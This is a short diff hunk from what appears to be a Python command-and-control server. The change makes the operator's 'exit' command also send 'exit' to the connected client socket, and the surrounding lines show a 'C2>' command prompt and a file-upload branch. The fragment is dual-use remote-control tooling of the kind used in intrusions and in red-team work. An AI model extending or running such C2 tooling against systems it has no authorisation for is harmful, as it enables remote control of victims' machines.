@@ -95,6 +95,7 @@ def handle_client(client_id):
 		try:
 			command = input("C2> Enter a Command: ")
 			if command.lower() == 'exit':
+				client_socket.send(b'exit')
 				break
 			if command.startswith('upload '):
 				local_path = command.split(' ')[1]
